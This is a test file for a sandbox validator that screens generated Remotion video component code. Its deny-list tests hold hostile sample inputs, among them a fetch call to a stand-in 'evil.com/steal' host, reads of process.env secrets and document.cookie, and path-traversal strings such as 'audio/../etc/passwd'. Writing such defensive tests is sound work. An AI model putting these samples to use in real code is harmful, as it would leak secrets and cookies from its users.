import {
  isAudioAllowListed,
  sanitizeCode,
  validateCode,
  validateFrameDrivenMotion,
  validateLucideIdentifiers,
} from '@/lib/remotion/sandbox';
import {
  LUCIDE_VALID_NAMES,
  LUCIDE_FUZZY_FIXES,
  pickLucideFallback,
  __lucideWhitelistSize,
} from '@/lib/lucide-whitelist';

describe('validateCode', () => {
  it('allows clean Remotion component code', () => {
    const code = `
      const { useCurrentFrame, AbsoluteFill } = remotion;
      const PARAMS = { color: '#fff' };
      const Component = () => <AbsoluteFill style={{ backgroundColor: PARAMS.color }} />;
    `;
    expect(validateCode(code)).toEqual({ valid: true, errors: [] });
  });

  it('blocks eval usage', () => {
    const code = `eval('malicious code')`;
    expect(validateCode(code).valid).toBe(false);
    expect(validateCode(code).errors).toContain('Forbidden: eval');
  });

  it('blocks fetch usage', () => {
    const code = `fetch('https://evil.com/steal')`;
    expect(validateCode(code).valid).toBe(false);
  });

  it('blocks process access', () => {
    const code = `process.env.SECRET`;
    expect(validateCode(code).valid).toBe(false);
  });

  it('blocks document.cookie access', () => {
    const code = `document.cookie`;
    expect(validateCode(code).valid).toBe(false);
  });

  it('blocks dynamic import', () => {
    const code = `import('malicious')`;
    expect(validateCode(code).valid).toBe(false);
  });

  it('blocks require', () => {
    const code = `require('fs')`;
    expect(validateCode(code).valid).toBe(false);
  });

  // TM-34 — extended deny list
  it('blocks new Function', () => {
    expect(validateCode(`const f = new Function('return 1');`).valid).toBe(false);
  });

  it('blocks setTimeout-with-string', () => {
    expect(validateCode(`setTimeout("alert(1)", 0);`).valid).toBe(false);
  });

  it('blocks WebSocket', () => {
    expect(validateCode(`const ws = new WebSocket('wss://e.com');`).valid).toBe(false);
  });

  it('blocks navigator.sendBeacon', () => {
    expect(validateCode(`navigator.sendBeacon('/x', d);`).valid).toBe(false);
  });

  it('blocks indexedDB', () => {
    expect(validateCode(`indexedDB.open('x');`).valid).toBe(false);
  });

  it('blocks __proto__ assignment', () => {
    expect(validateCode(`obj.__proto__ = bad;`).valid).toBe(false);
  });

  it('blocks __defineGetter__', () => {
    expect(validateCode(`o.__defineGetter__('x', f);`).valid).toBe(false);
  });

  it('blocks with statement', () => {
    expect(validateCode(`with (obj) { x = 1; }`).valid).toBe(false);
  });

  it('blocks Worker spawn', () => {
    expect(validateCode(`new Worker('w.js')`).valid).toBe(false);
    expect(validateCode(`new SharedWorker('w.js')`).valid).toBe(false);
  });

  it('blocks location.assign', () => {
    expect(validateCode(`location.assign('/evil');`).valid).toBe(false);
  });

  it('blocks EventSource', () => {
    expect(validateCode(`new EventSource('/sse');`).valid).toBe(false);
  });

  it('does not double-report the same forbidden token', () => {
    const code = `eval('1'); eval('2'); eval('3');`;
    const errors = validateCode(code).errors;
    expect(errors.filter(e => e === 'Forbidden: eval')).toHaveLength(1);
  });

  // TM-123 — visual-only policy. Audio/Video/OffthreadVideo/IFrame are
  // rejected because generated assets have no source-of-truth for `src`.
  describe('TM-123 visual-only media policy', () => {
    it('blocks <Audio src={number}> (the exact user-blocking case)', () => {
      const code = `
        const PARAMS = { volume: 0 };
        const C = () => <Audio src={PARAMS.volume} />;
      `;
      const result = validateCode(code);
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.includes('Audio'))).toBe(true);
    });

    it('blocks <Audio src="..."> even with a string src', () => {
      const code = `const C = () => <Audio src="https://example.com/x.mp3" />;`;
      expect(validateCode(code).valid).toBe(false);
    });

    it('blocks <Video src={...}>', () => {
      const code = `const C = () => <Video src={PARAMS.url} />;`;
      expect(validateCode(code).valid).toBe(false);
      expect(validateCode(code).errors.some(e => e.includes('Video'))).toBe(true);
    });

    it('blocks <OffthreadVideo>', () => {
      const code = `const C = () => <OffthreadVideo src="x" />;`;
      expect(validateCode(code).valid).toBe(false);
    });

    it('blocks <IFrame>', () => {
      const code = `const C = () => <IFrame src="x" />;`;
      expect(validateCode(code).valid).toBe(false);
    });

    it('blocks <Audio  /> with extra whitespace', () => {
      const code = `const C = () => < Audio  src="x" />;`;
      expect(validateCode(code).valid).toBe(false);
    });

    it('does NOT flag identifiers that merely contain "Audio" as a substring', () => {
      // Defensive: bare word matches should require a JSX-open prefix (`<`).
      const code = `
        const PARAMS = { showAudioBars: true };
        const audioVisualizer = 1;
        const C = () => <AbsoluteFill>{audioVisualizer}</AbsoluteFill>;
      `;
      const result = validateCode(code);
      // Audio-substring identifiers should NOT trigger the media deny rule.
      expect(result.errors.find(e => e.includes('TM-123'))).toBeUndefined();
    });

    it('does NOT flag <AudioBars> or other components that just start with "Audio"', () => {
      const code = `
        const AudioBars = () => <AbsoluteFill />;
        const C = () => <AudioBars />;
      `;
      const result = validateCode(code);
      expect(result.errors.find(e => e?.includes('TM-123'))).toBeUndefined();
    });
  });

  // TM-140 / ADR-0027 — bare <Lottie> denied; <CatalogueLottie> accepted.
  describe('TM-140 <Lottie> deny + <CatalogueLottie> wrapper allow', () => {
    it('blocks bare <Lottie animationData={...} />', () => {
      const code = `const C = () => <Lottie animationData={data} />;`;
      const result = validateCode(code);
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.includes('Lottie') && e.includes('ADR-0027'))).toBe(true);
    });

    it('blocks bare < Lottie /> with whitespace', () => {
      const code = `const C = () => < Lottie animationData={x} />;`;
      expect(validateCode(code).valid).toBe(false);
    });

    it('accepts <CatalogueLottie asset={lottieAsset} />', () => {
      const code = `
        const PARAMS = { lottieAsset: 'lottie/bear-walk.json' };
        const C = () => <CatalogueLottie asset={PARAMS.lottieAsset} loop />;
      `;
      const result = validateCode(code);
      expect(result.errors.find(e => e?.includes('Lottie'))).toBeUndefined();
    });

    it('does NOT flag identifiers that merely contain "Lottie" as a substring', () => {
      const code = `
        const PARAMS = { showLottieBadge: true };
        const lottieReady = 1;
        const C = () => <AbsoluteFill>{lottieReady}</AbsoluteFill>;
      `;
      const result = validateCode(code);
      expect(result.errors.find(e => e?.includes('Lottie'))).toBeUndefined();
    });
  });

  // TM-128 / ADR-0026 §2 — structural Audio allow-list.
  // <Audio src={staticFile("audio/<slug>.mp3")} /> is the ONLY shape that
  // bypasses the TM-123 deny rule. Every other shape continues to reject.
  describe('TM-128 <Audio> structural allow-list', () => {
    const audioErr = (errors: string[]) =>
      errors.find((e) => e.startsWith('Forbidden: <Audio>'));

    describe('positive (allow)', () => {
      it('passes <Audio src={staticFile("audio/chill-1.mp3")} />', () => {
        const code = `const C = () => <Audio src={staticFile("audio/chill-1.mp3")} />;`;
        expect(validateCode(code)).toEqual({ valid: true, errors: [] });
        expect(isAudioAllowListed(code)).toBe(true);
      });

      it("passes single-quoted catalogue slug", () => {
        const code = `const C = () => <Audio src={staticFile('audio/upbeat-runner.mp3')} />;`;
        expect(validateCode(code).valid).toBe(true);
      });

      it('passes with extra props (volume, loop) before/after src', () => {
        const code = `
          const C = () => (
            <Audio
              volume={0.5}
              src={staticFile("audio/lofi-cassette.mp3")}
              loop
            />
          );
        `;
        expect(validateCode(code).valid).toBe(true);
      });

      it('passes when allow-listed Audio coexists with PARAMS const', () => {
        const code = `
          const PARAMS = { bgmTrack: "audio/cinematic-aurora.mp3" };
          const C = () => <Audio src={staticFile("audio/cinematic-aurora.mp3")} />;
        `;
        expect(validateCode(code).valid).toBe(true);
      });
    });

    describe('negative (reject)', () => {
      it('rejects numeric src (the original TM-123 user-blocking case)', () => {
        const code = `
          const PARAMS = { volume: 0 };
          const C = () => <Audio src={PARAMS.volume} />;
        `;
        const r = validateCode(code);
        expect(r.valid).toBe(false);
        expect(audioErr(r.errors)).toBeDefined();
      });

      it('rejects dynamic variable src (no staticFile call)', () => {
        const code = `
          const path = "audio/chill-sunrise.mp3";
          const C = () => <Audio src={staticFile(path)} />;
        `;
        const r = validateCode(code);
        expect(r.valid).toBe(false);
        expect(audioErr(r.errors)).toBeDefined();
      });

      it('rejects template-string src (literal-string-only)', () => {
        const code =
          'const slug = "chill-sunrise"; const C = () => <Audio src={staticFile(`audio/${slug}.mp3`)} />;';
        const r = validateCode(code);
        expect(r.valid).toBe(false);
        expect(audioErr(r.errors)).toBeDefined();
      });

      it('rejects external URL src', () => {
        const code = `const C = () => <Audio src="https://example.com/x.mp3" />;`;
        const r = validateCode(code);
        expect(r.valid).toBe(false);
        expect(audioErr(r.errors)).toBeDefined();
      });

      it('rejects path traversal slug (audio/../etc/passwd)', () => {
        const code = `const C = () => <Audio src={staticFile("audio/../etc/passwd")} />;`;
        const r = validateCode(code);
        expect(r.valid).toBe(false);
        expect(audioErr(r.errors)).toBeDefined();
      });

      it('rejects wrong extension (.wav)', () => {
        const code = `const C = () => <Audio src={staticFile("audio/chill.wav")} />;`;
        const r = validateCode(code);
        expect(r.valid).toBe(false);
        expect(audioErr(r.errors)).toBeDefined();
      });

      it('rejects uppercase / disallowed chars in slug', () => {
        const code = `const C = () => <Audio src={staticFile("audio/Chill_1.mp3")} />;`;
        const r = validateCode(code);
        expect(r.valid).toBe(false);
        expect(audioErr(r.errors)).toBeDefined();
      });

      it('rejects mixed: one allow-listed + one variant in the same file', () => {
        const code = `
          const A = () => <Audio src={staticFile("audio/chill-sunrise.mp3")} />;
          const B = () => <Audio src={someVar} />;
        `;
        const r = validateCode(code);
        expect(r.valid).toBe(false);
        expect(audioErr(r.errors)).toBeDefined();
      });

      it('rejects slug outside the audio/ subdirectory', () => {
        const code = `const C = () => <Audio src={staticFile("uploads/chill-1.mp3")} />;`;
        const r = validateCode(code);
        expect(r.valid).toBe(false);
        expect(audioErr(r.errors)).toBeDefined();
      });

      it('does NOT re-permit <Video> via the allow shape', () => {
        const code = `const C = () => <Video src={staticFile("audio/chill-1.mp3")} />;`;
        const r = validateCode(code);
        expect(r.valid).toBe(false);
        expect(r.errors.some((e) => e.includes('Video'))).toBe(true);
      });
    });
  });
});

// TM-132 / ADR-0026 §B amendment — `<CatalogueAudio>` wrapper passes the
// sandbox without an explicit allow-list because the existing `<\s*Audio\b`
// deny regex requires `<` immediately followed by `Audio`. The wrapper's
// runtime guard (`isValidCatalogTrack`) handles malformed `track` props at
// render time, not at sandbox validation time. Verify both:
//   - the wrapper tag is unconditionally accepted by the sandbox
//   - the wrapper tag does NOT accidentally re-open the literal `<Audio>`
//     deny path (e.g. via word-boundary regression)
describe('TM-132 <CatalogueAudio> wrapper allow', () => {
  const audioErr = (errors: string[]) =>
    errors.find((e) => e.startsWith('Forbidden: <Audio>'));

  it('accepts <CatalogueAudio track={bgmTrack} /> (PARAMS-bound)', () => {
    const code = `
      const PARAMS = { bgmTrack: 'audio/chill-sunrise.mp3', bgmVolume: 0.6 };
      const C = ({ bgmTrack = PARAMS.bgmTrack, bgmVolume = PARAMS.bgmVolume }) =>
        <AbsoluteFill>
          <CatalogueAudio track={bgmTrack} volume={bgmVolume} />
        </AbsoluteFill>;
    `;
    const r = validateCode(code);
    expect(r.valid).toBe(true);
    expect(r.errors).toEqual([]);
  });

  it('accepts <CatalogueAudio track="chill-sunrise.mp3" /> (literal string)', () => {
    const code = `const C = () => <CatalogueAudio track="chill-sunrise.mp3" />;`;
    const r = validateCode(code);
    expect(r.valid).toBe(true);
  });

  it('accepts <CatalogueAudio track="../etc/passwd" /> at sandbox layer (runtime guard rejects)', () => {
    // The sandbox cannot statically know the runtime value; the wrapper's
    // `isValidCatalogTrack` guard is what protects against traversal at
    // render time. Sandbox passing here is intentional + documented.
    const code = `const C = () => <CatalogueAudio track="../etc/passwd" />;`;
    const r = validateCode(code);
    expect(r.valid).toBe(true);
  });

  it('does NOT trip the <Audio> deny when wrapper is used (no false-positive token match)', () => {
    const code = `
      const C = () => <CatalogueAudio track="chill-sunrise.mp3" volume={0.6} />;
    `;
    const r = validateCode(code);
    expect(audioErr(r.errors)).toBeUndefined();
  });

  it('still denies a bare <Audio> tag even when <CatalogueAudio> is also present', () => {
    const code = `
      const A = () => <CatalogueAudio track="chill-sunrise.mp3" />;
      const B = () => <Audio src={someVar} />;
    `;
    const r = validateCode(code);
    expect(r.valid).toBe(false);
    expect(audioErr(r.errors)).toBeDefined();
  });

  it('coexists with the legacy literal <Audio src={staticFile("audio/...")}/> shape', () => {
    const code = `
      const A = () => <CatalogueAudio track="chill-sunrise.mp3" />;
      const B = () => <Audio src={staticFile("audio/upbeat-runner.mp3")} />;
    `;
    const r = validateCode(code);
    expect(r.valid).toBe(true);
  });
});

describe('sanitizeCode', () => {
  it('removes remotion import statements', () => {
    const code = `import { useCurrentFrame } from 'remotion';\nconst frame = useCurrentFrame();`;
    const result = sanitizeCode(code);
    expect(result).not.toContain("from 'remotion'");
    expect(result).toContain('const frame = useCurrentFrame()');
  });

  it('removes react import statements', () => {
    const code = `import React from 'react';\nconst x = 1;`;
    const result = sanitizeCode(code);
    expect(result).not.toContain("from 'react'");
  });

  // TM-132 — strip stray `CatalogueAudio` import (wrapper is injected as a
  // local in evaluator.ts; an explicit import would crash module resolution).
  it('removes stray @/remotion/CatalogueAudio import', () => {
    const code = `import { CatalogueAudio } from '@/remotion/CatalogueAudio';\nconst x = 1;`;
    const result = sanitizeCode(code);
    expect(result).not.toContain('CatalogueAudio');
    expect(result).toContain('const x = 1');
  });

  it('removes stray remotion/CatalogueAudio import (no @ alias)', () => {
    const code = `import { CatalogueAudio } from 'remotion/CatalogueAudio';\nconst x = 1;`;
    const result = sanitizeCode(code);
    expect(result).not.toContain('CatalogueAudio');
  });
});

// ---------------------------------------------------------------------------
// TM-168 — imageUrl composition rule. Covers the TM-166 failure modes:
//   - bear-png reference via bare `imageUrl` identifier (Scene2 crash)
//   - solid purple `<AbsoluteFill>` overlay covering the PNG
//   - 200px-tall solid `<div>` band over the bear
//   - PARAMS.imageUrl declared but never spliced (LLM ignored addendum)
// All positive tests intentionally exercise the realistic composition
// shape the system prompt asks for.
// ---------------------------------------------------------------------------
describe('TM-168 imageUrl composition rule', () => {
  // ---------- POSITIVE ----------
  it('allows full-bleed Img with PARAMS.imageUrl + no overlay', () => {
    const code = `
      const PARAMS = { imageUrl: 'https://cdn/bear.png', bgColor: '#86c2ee' };
      const Component = ({ imageUrl = PARAMS.imageUrl } = PARAMS) => (
        <AbsoluteFill>
          <Img src={PARAMS.imageUrl} style={{ width: '100%', height: '100%', objectFit: 'cover' }} />
        </AbsoluteFill>
      );
    `;
    const result = validateCode(code);
    expect(result).toEqual({ valid: true, errors: [] });
  });

  it('allows destructured imageUrl prop default', () => {
    const code = `
      const PARAMS = { imageUrl: 'https://cdn/bear.png' };
      const Component = ({ imageUrl = PARAMS.imageUrl } = PARAMS) => (
        <AbsoluteFill>
          <Img src={imageUrl} style={{ width: '100%', height: '100%', objectFit: 'cover' }} />
        </AbsoluteFill>
      );
    `;
    expect(validateCode(code).valid).toBe(true);
  });

  it('allows animated opacity overlay (motion layer)', () => {
    const code = `
      const PARAMS = { imageUrl: 'https://cdn/bear.png' };
      const Component = () => {
        const opacity = interpolate(useCurrentFrame(), [0, 30], [0, 1]);
        return (
          <AbsoluteFill>
            <Img src={PARAMS.imageUrl} style={{ width: '100%', height: '100%', objectFit: 'cover' }} />
            <AbsoluteFill style={{ backgroundColor: '#000', opacity }} />
          </AbsoluteFill>
        );
      };
    `;
    expect(validateCode(code).valid).toBe(true);
  });

  it('allows rgba/transparent backgroundColor overlay', () => {
    const code = `
      const PARAMS = { imageUrl: 'https://cdn/bear.png' };
      const Component = () => (
        <AbsoluteFill>
          <Img src={PARAMS.imageUrl} style={{ width: '100%', height: '100%', objectFit: 'cover' }} />
          <AbsoluteFill style={{ backgroundColor: 'rgba(0,0,0,0.3)' }} />
        </AbsoluteFill>
      );
    `;
    expect(validateCode(code).valid).toBe(true);
  });

  it('is a no-op on non-image compositions (no PARAMS.imageUrl)', () => {
    const code = `
      const PARAMS = { bgColor: '#0f0f17' };
      const Component = () => (
        <AbsoluteFill style={{ backgroundColor: PARAMS.bgColor }}>
          <AbsoluteFill style={{ backgroundColor: '#7C3AED' }} />
        </AbsoluteFill>
      );
    `;
    expect(validateCode(code).valid).toBe(true);
  });

  // ---------- NEGATIVE ----------
  it('rejects bare `imageUrl` identifier with no destructured default (TM-166 Scene2 bug)', () => {
    const code = `
      const PARAMS = { imageUrl: 'https://cdn/bear.png' };
      const Component = () => (
        <AbsoluteFill>
          <Img src={imageUrl} style={{ width: '100%', height: '100%' }} />
        </AbsoluteFill>
      );
    `;
    const result = validateCode(code);
    expect(result.valid).toBe(false);
    expect(result.errors.some(e => /imageUrl rule:.*must reference PARAMS\.imageUrl/.test(e))).toBe(true);
  });

  it('rejects PARAMS.imageUrl declared but no <Img> rendered', () => {
    const code = `
      const PARAMS = { imageUrl: 'https://cdn/bear.png', bgColor: '#86c2ee' };
      const Component = () => (
        <AbsoluteFill style={{ backgroundColor: PARAMS.bgColor }} />
      );
    `;
    const result = validateCode(code);
    expect(result.valid).toBe(false);
    expect(result.errors.some(e => /no <Img> tag found/.test(e))).toBe(true);
  });

  it('rejects solid <AbsoluteFill> overlay above <Img> (TM-166 purple-band bug)', () => {
    const code = `
      const PARAMS = { imageUrl: 'https://cdn/bear.png' };
      const Component = () => (
        <AbsoluteFill>
          <Img src={PARAMS.imageUrl} style={{ width: '100%', height: '100%', objectFit: 'cover' }} />
          <AbsoluteFill style={{ backgroundColor: '#7C3AED' }} />
        </AbsoluteFill>
      );
    `;
    const result = validateCode(code);
    expect(result.valid).toBe(false);
    expect(result.errors.some(e => /opaque solid.*sibling found after <Img>/.test(e))).toBe(true);
  });

  it('rejects solid full-width <div> band above <Img>', () => {
    const code = `
      const PARAMS = { imageUrl: 'https://cdn/bear.png' };
      const Component = () => (
        <AbsoluteFill>
          <Img src={PARAMS.imageUrl} style={{ width: '100%', height: '100%', objectFit: 'cover' }} />
          <div style={{ position: 'absolute', top: 800, width: '100%', height: 200, backgroundColor: '#7C3AED' }} />
        </AbsoluteFill>
      );
    `;
    const result = validateCode(code);
    expect(result.valid).toBe(false);
    expect(result.errors.some(e => /opaque solid/.test(e))).toBe(true);
  });
});

describe('TM-176 full-bleed Img objectFit rule', () => {
  // ---------- NEGATIVE (reject) ----------
  it("rejects AbsoluteFill > Img with objectFit:'contain' + width/height 100% (TM-167 letterbox bug)", () => {
    const code = `
      const PARAMS = { imageUrl: 'https://cdn/bear.png' };
      const Component = () => (
        <AbsoluteFill>
          <Img src={PARAMS.imageUrl} style={{ width: '100%', height: '100%', objectFit: 'contain' }} />
        </AbsoluteFill>
      );
    `;
    const result = validateCode(code);
    expect(result.valid).toBe(false);
    expect(
      result.errors.some(e => /Img rule \(TM-176\):.*objectFit:'contain' letterboxes/.test(e)),
    ).toBe(true);
  });

  it("rejects full-bleed Img with 100vw/100vh + contain", () => {
    const code = `
      const PARAMS = { imageUrl: 'https://cdn/bear.png' };
      const Component = () => (
        <AbsoluteFill>
          <Img src={PARAMS.imageUrl} style={{ width: '100vw', height: '100vh', objectFit: 'contain' }} />
        </AbsoluteFill>
      );
    `;
    expect(validateCode(code).valid).toBe(false);
  });

  it('reports the TM-176 message only once even when multiple full-bleed contain Imgs exist', () => {
    const code = `
      const PARAMS = { imageUrl: 'https://cdn/bear.png' };
      const Component = () => (
        <AbsoluteFill>
          <Img src={PARAMS.imageUrl} style={{ width: '100%', height: '100%', objectFit: 'contain' }} />
          <Img src={PARAMS.imageUrl} style={{ width: '100%', height: '100%', objectFit: 'contain' }} />
        </AbsoluteFill>
      );
    `;
    const result = validateCode(code);
    const matches = result.errors.filter(e => /Img rule \(TM-176\)/.test(e));
    expect(matches).toHaveLength(1);
  });

  // ---------- POSITIVE (pass) ----------
  it("allows full-bleed Img with objectFit:'cover'", () => {
    const code = `
      const PARAMS = { imageUrl: 'https://cdn/bear.png' };
      const Component = () => (
        <AbsoluteFill>
          <Img src={PARAMS.imageUrl} style={{ width: '100%', height: '100%', objectFit: 'cover' }} />
        </AbsoluteFill>
      );
    `;
    expect(validateCode(code).valid).toBe(true);
  });

  it("allows small inline Img with objectFit:'contain' (intentional, e.g. logo/badge)", () => {
    const code = `
      const PARAMS = { logoUrl: 'https://cdn/logo.png' };
      const Component = () => (
        <AbsoluteFill style={{ backgroundColor: '#0f0f17' }}>
          <Img src={PARAMS.logoUrl} style={{ width: 200, height: 200, objectFit: 'contain' }} />
        </AbsoluteFill>
      );
    `;
    expect(validateCode(code).valid).toBe(true);
  });

  it("allows Img with only width:'100%' (height auto) + contain — not full-bleed", () => {
    const code = `
      const PARAMS = { bannerUrl: 'https://cdn/banner.png' };
      const Component = () => (
        <AbsoluteFill style={{ backgroundColor: '#fff' }}>
          <Img src={PARAMS.bannerUrl} style={{ width: '100%', height: 400, objectFit: 'contain' }} />
        </AbsoluteFill>
      );
    `;
    expect(validateCode(code).valid).toBe(true);
  });

  it('allows full-bleed Img with no objectFit specified', () => {
    const code = `
      const PARAMS = { imageUrl: 'https://cdn/bear.png' };
      const Component = () => (
        <AbsoluteFill>
          <Img src={PARAMS.imageUrl} style={{ width: '100%', height: '100%' }} />
        </AbsoluteFill>
      );
    `;
    // TM-176 is silent here — only fires when objectFit:'contain' is explicit.
    // (TM-168 / other rules may still apply, but not this one.)
    const result = validateCode(code);
    expect(result.errors.some(e => /TM-176/.test(e))).toBe(false);
  });
});

// TM-175 — lucide-react export whitelist.
describe('TM-175 — lucide whitelist', () => {
  it('whitelist contains thousands of real lucide exports', () => {
    // lucide-react ships ~5800+ icons across PascalCase variants;
    // assert a generous lower bound so a future shrinkage trips the test.
    expect(__lucideWhitelistSize()).toBeGreaterThan(1000);
  });

  it.each(['Star', 'Heart', 'Sparkles', 'Flower', 'Sun', 'Moon', 'Hash', 'ChartBar'])(
    'whitelists real export `%s`',
    name => {
      expect(LUCIDE_VALID_NAMES.has(name)).toBe(true);
    },
  );

  it.each(['Flowers', 'CharacterIcon', 'SunRise', 'TotallyMadeUpThing'])(
    'rejects invented identifier `%s`',
    name => {
      expect(LUCIDE_VALID_NAMES.has(name)).toBe(false);
    },
  );

  it('every fuzzy-fix target is itself a real lucide export', () => {
    // Guards against a typo in LUCIDE_FUZZY_FIXES silently mapping one
    // invented name to another invented name.
    for (const [bad, good] of Object.entries(LUCIDE_FUZZY_FIXES)) {
      expect(LUCIDE_VALID_NAMES.has(bad)).toBe(false); // sanity: maps source IS invented
      expect(LUCIDE_VALID_NAMES.has(good)).toBe(true); // and target IS real
    }
  });

  it('pickLucideFallback returns the fuzzy fix when available', () => {
    expect(pickLucideFallback('Flowers')).toBe('Flower');
    expect(pickLucideFallback('CharacterIcon')).toBe('User');
  });

  it('pickLucideFallback defaults to Star otherwise', () => {
    expect(pickLucideFallback('SomethingNobodyDefined')).toBe('Star');
  });
});

describe('TM-175 — validateLucideIdentifiers', () => {
  it('returns no errors for valid icons (Star/Heart/Sparkles/Flower)', () => {
    const code = `<lucide.Star/><lucide.Heart/><lucide.Sparkles/><lucide.Flower/>`;
    expect(validateLucideIdentifiers(code)).toEqual([]);
  });

  it('returns one error per distinct invented icon, naming it', () => {
    const code = `<lucide.Flowers/> ... <lucide.CharacterIcon/>`;
    const errors = validateLucideIdentifiers(code);
    expect(errors).toHaveLength(2);
    expect(errors.some(e => /lucide\.Flowers/.test(e) && /not a real lucide-react export/.test(e))).toBe(true);
    expect(errors.some(e => /lucide\.CharacterIcon/.test(e))).toBe(true);
  });

  it('dedupes repeated invented names', () => {
    const code = `<lucide.Flowers/><lucide.Flowers/><lucide.Flowers/>`;
    expect(validateLucideIdentifiers(code)).toHaveLength(1);
  });

  it('matches bare member-access too (const I = lucide.Flowers)', () => {
    const code = `const I = lucide.Flowers;`;
    expect(validateLucideIdentifiers(code)).toHaveLength(1);
  });

  it('integrates with validateCode — rejects invented icon as invalid', () => {
    const code = `const C = () => <lucide.Flowers size={48}/>;`;
    const result = validateCode(code);
    expect(result.valid).toBe(false);
    expect(result.errors.some(e => /lucide\.Flowers/.test(e))).toBe(true);
  });

  it('integrates with validateCode — passes valid icon usage', () => {
    const code = `const C = () => <lucide.Star size={48}/>;`;
    const result = validateCode(code);
    expect(result.valid).toBe(true);
  });
});

// TM-185 — CSS-animation deny. Time-based CSS animation freezes at t=0
// under Remotion's frame-isolated render ("the video doesn't move").
describe('TM-185 frame-driven motion enforcement', () => {
  // --- The 5 acceptance reject cases ---------------------------------------
  it('rejects @keyframes in a template-string CSS block', () => {
    const code = `
      const css = \`@keyframes spin { from { transform: rotate(0); } to { transform: rotate(360deg); } }\`;
      const C = () => <AbsoluteFill><style>{css}</style></AbsoluteFill>;
    `;
    const result = validateCode(code);
    expect(result.valid).toBe(false);
    expect(result.errors.some(e => /TM-185.*@keyframes/.test(e))).toBe(true);
  });

  it('rejects CSS transition shorthand with a non-zero time', () => {
    const code = `
      const PARAMS = { color: '#fff' };
      const C = () => <div style={{ width: '50%', transition: 'width 0.3s' }} />;
    `;
    const result = validateCode(code);
    expect(result.valid).toBe(false);
    expect(result.errors.some(e => /TM-185.*transition/.test(e))).toBe(true);
  });

  it('rejects transitionDuration with a non-zero ms time', () => {
    const code = `const C = () => <div style={{ transitionDuration: '200ms' }} />;`;
    const result = validateCode(code);
    expect(result.valid).toBe(false);
    expect(result.errors.some(e => /TM-185.*transition/.test(e))).toBe(true);
  });

  it('rejects the CSS animation shorthand', () => {
    const code = `const C = () => <div style={{ animation: 'spin 2s linear infinite' }} />;`;
    const result = validateCode(code);
    expect(result.valid).toBe(false);
    expect(result.errors.some(e => /TM-185.*animation/.test(e))).toBe(true);
  });

  it('rejects animationName binding a keyframe timeline', () => {
    const code = `const C = () => <div style={{ animationName: 'pulse', animationDuration: '1s' }} />;`;
    const result = validateCode(code);
    expect(result.valid).toBe(false);
    expect(result.errors.some(e => /TM-185.*animation/.test(e))).toBe(true);
  });

  // --- False-positive guards: frame-driven code MUST pass -------------------
  it('ALLOWS clean frame-driven interpolate/spring code', () => {
    const code = `
      const PARAMS = { color: '#fff' };
      const C = () => {
        const frame = useCurrentFrame();
        const { fps } = useVideoConfig();
        const x = interpolate(frame, [0, 30], [0, 200]);
        const s = spring({ frame, fps, config: { damping: 14 } });
        return <AbsoluteFill style={{ transform: \`translateX(\${x}px) scale(\${s})\` }} />;
      };
    `;
    expect(validateFrameDrivenMotion(code)).toEqual([]);
    expect(validateCode(code).valid).toBe(true);
  });

  it('does NOT flag component identifiers like ZoomTransition / CounterAnimation', () => {
    const code = `
      const ZoomTransition = () => null;
      const CounterAnimation = () => null;
      const C = () => <AbsoluteFill><ZoomTransition /><CounterAnimation /></AbsoluteFill>;
    `;
    expect(validateFrameDrivenMotion(code)).toEqual([]);
  });

  it('does NOT flag a local variable named transition or animation', () => {
    const code = `
      const transition = interpolate(useCurrentFrame(), [0, 30], [0, 1]);
      const animation = transition * 2;
      const C = () => <AbsoluteFill style={{ opacity: transition }}>{animation}</AbsoluteFill>;
    `;
    expect(validateFrameDrivenMotion(code)).toEqual([]);
  });

  it('does NOT flag vendor-prefixed WebkitTransition keys', () => {
    const code = `const C = () => <div style={{ WebkitTransition: 'none' }} />;`;
    expect(validateFrameDrivenMotion(code)).toEqual([]);
  });

  it('ALLOWS transition: none / 0s (inert, animates nothing)', () => {
    expect(validateFrameDrivenMotion(`<div style={{ transition: 'none' }} />`)).toEqual([]);
    expect(validateFrameDrivenMotion(`<div style={{ transition: 'width 0s' }} />`)).toEqual([]);
    expect(validateFrameDrivenMotion(`<div style={{ transitionDuration: '0s' }} />`)).toEqual([]);
  });

  it('ALLOWS bare transitionProperty without a duration (inert)', () => {
    const code = `const C = () => <div style={{ transitionProperty: 'width' }} />;`;
    expect(validateFrameDrivenMotion(code)).toEqual([]);
  });

  it('does NOT flag the word "transition" inside a string/text content', () => {
    const code = `const C = () => <AbsoluteFill><div>scene transition here</div></AbsoluteFill>;`;
    expect(validateFrameDrivenMotion(code)).toEqual([]);
  });

  it('reports the CSS transition only once even with multiple offenders', () => {
    const code = `
      const C = () => (<AbsoluteFill>
        <div style={{ transition: 'width 0.3s' }} />
        <div style={{ transition: 'opacity 0.5s' }} />
      </AbsoluteFill>);
    `;
    const hits = validateFrameDrivenMotion(code).filter(e => /transition/.test(e));
    expect(hits).toHaveLength(1);
  });
});
